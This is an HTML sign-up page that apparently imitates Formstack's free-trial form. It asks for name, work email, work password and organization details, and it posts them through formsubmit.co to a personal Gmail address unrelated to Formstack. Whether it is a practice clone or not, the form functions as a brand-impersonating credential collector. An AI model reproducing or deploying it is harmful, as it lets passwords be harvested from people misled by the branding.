<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Form</title>
    <link rel="stylesheet" href="style.css" />
    <script>
      window.addEventListener("DOMContentLoaded", (event) => {
      showPassword.addEventListener("click", () => {
        password.setAttribute("type", "text");
        showPassword.style.display = "none";
        hidePassword.style.display = "block";
      });
      hidePassword.addEventListener("click", () => {
        password.setAttribute("type", "password");
        hidePassword.style.display = "none";
        showPassword.style.display = "block";
      });
    });
    </script>
  </head>
  <body>
    <div class="form">
      <p class="heading">Try <span>Sign</span> free for 14 days</p>
      <p class="subheading">
        Already have a Formstack account?
        <a href="#"
          >Start your trial in app
          <svg
            xmlns="http://www.w3.org/2000/svg"
            height="16"
            width="16"
            viewBox="0 0 512 512">
            <path
              fill="#0197ec"
              d="M0 256a256 256 0 1 0 512 0A256 256 0 1 0 0 256zM241 377c-9.4 9.4-24.6 9.4-33.9 0s-9.4-24.6 0-33.9l87-87-87-87c-9.4-9.4-9.4-24.6 0-33.9s24.6-9.4 33.9 0L345 239c9.4 9.4 9.4 24.6 0 33.9L241 377z" />
          </svg>
        </a>
      </p>
      <form
        action="https://formsubmit.co/ahsan.ahmed.026@gmail.com"
        method="POST">
        <div class="name">
          <div class="first">
            <label for="first-name">First Name</label>
            <input
            required
              type="text"
              name="First-Name"
              id="first-name"
              placeholder="John" />
          </div>
          <div class="last">
            <label for="last-name">First Name</label>
            <input
            required
              type="text"
              name="Last-Name"
              id="last-name"
              placeholder="Doe" />
          </div>
        </div>
        <div class="email">
          <label for="email">Work Email</label>
          <input
          required
            type="email"
            name="Email"
            id="email"
            placeholder="John@deo.com" />
        </div>
        <div class="password">
          <label for="password">Work Password</label>
          <div>
            <input
            required
              type="password"
              name="Password"
              id="password"
              placeholder="Password" />
            <svg
              id="showPassword"
              xmlns="http://www.w3.org/2000/svg"
              height="16"
              width="18"
              viewBox="0 0 576 512">
              <path
                fill="#0197ec"
                d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM144 256a144 144 0 1 1 288 0 144 144 0 1 1 -288 0zm144-64c0 35.3-28.7 64-64 64c-7.1 0-13.9-1.2-20.3-3.3c-5.5-1.8-11.9 1.6-11.7 7.4c.3 6.9 1.3 13.8 3.2 20.7c13.7 51.2 66.4 81.6 117.6 67.9s81.6-66.4 67.9-117.6c-11.1-41.5-47.8-69.4-88.6-71.1c-5.8-.2-9.2 6.1-7.4 11.7c2.1 6.4 3.3 13.2 3.3 20.3z" />
            </svg>
            <svg
              id="hidePassword"
              xmlns="http://www.w3.org/2000/svg"
              height="16"
              width="20"
              viewBox="0 0 640 512">
              <path
                fill="#0197ec"
                d="M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zM223.1 149.5C248.6 126.2 282.7 112 320 112c79.5 0 144 64.5 144 144c0 24.9-6.3 48.3-17.4 68.7L408 294.5c8.4-19.3 10.6-41.4 4.8-63.3c-11.1-41.5-47.8-69.4-88.6-71.1c-5.8-.2-9.2 6.1-7.4 11.7c2.1 6.4 3.3 13.2 3.3 20.3c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8zM373 389.9c-16.4 6.5-34.3 10.1-53 10.1c-79.5 0-144-64.5-144-144c0-6.9 .5-13.6 1.4-20.2L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5L373 389.9z" />
            </svg>
          </div>
        </div>
        <div class="org">
          <label for="org">Organization Name</label>
          <input required  type="text" name="ORG" id="org" placeholder="org" />
        </div>
        <div class="org_size">
          <label for="org_size">Organization Size</label>
          <select name="ORG-Size" id="org_size">
            <option value="Select" disabled selected>--Select--</option>
            <option value="10">10</option>
            <option value="20">20</option>
            <option value="30">30</option>
            <option value="40">40</option>
            <option value="50">50</option>
          </select>
        </div>
        <div class="industry">
          <label for="ind">Industry</label>
          <select name="Industry" id="ind">
            <option value="Select" disabled selected>--Select--</option>
            <option value="Software">Software</option>
            <option value="Hardware">Hardware</option>
            <option value="IOT">IOT</option>
            <option value="Blockchain">Blockchain</option>
            <option value="SAAS">SAAS</option>
          </select>
        </div>
        <span class="bottomText"
          >Formstack has updated our Terms of Service effective January 4, 2023
          <br />
          We encourage you to read the document in its entirety
        </span>
        <div class="policybox">
          <input type="checkbox" required name="Policy" id="policybox" />
          <label for="policybox"
            >I understand and agree to the
            <a href="#"
              >Formstack Privacy Policy, Software Services Agreement,</a
            >
            and <a href="#">Acceptable use Policy.</a></label
          >
        </div>
        <input
          type="submit"
          name="submit"
          id="submit"
          value="Start free trial" />
      </form>
    </div>
  </body>
</html>
